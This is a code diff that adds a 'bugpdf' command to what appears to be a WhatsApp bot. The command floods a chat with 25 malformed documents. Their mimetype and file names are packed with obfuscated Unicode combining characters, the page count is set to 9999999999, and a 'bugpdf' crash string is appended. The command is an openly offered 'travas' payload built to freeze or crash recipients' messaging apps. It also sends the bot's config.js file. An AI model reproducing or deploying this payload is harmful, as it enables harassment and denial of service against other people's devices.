@@ -694,4 +694,43 @@ cmd({
 );
 
 ///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
+cmd({
+        pattern: "bugpdf",
+        desc: "Sends a travas bug pdf",
+        category: "Travas",
+        use: 'bugpdf',
+        react: "💣",
+        filename: __filename
+    },
 
+    async (Void, citel) => {
+
+
+        // send loading message
+        await Void.sendMessage(citel.chat, { text: `processing your bugpdf`},{ quoted: citel });
+
+        for (let i = 0; i < 25; i++) {
+            const doc = { url: "./config.js" };
+            await Void.sendMessage(citel.chat, {
+                document: doc,
+                mimetype:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
+                title: "travas.pdf",
+                pageCount: 9999999999,
+                thumbnail: {
+                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
+                },
+                thumbnailUrl:
+                    "https://telegra.ph/file/1fd66052a2f356014d861.jpg",
+                jpegThumbnail: {
+                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
+                },
+                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
+                fileName:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
+                    bugpdf
+            });
+        }
+        await Void.sendMessage(citel.chat, { react: { text: "✅", key: ms.key } });
+    }
+);
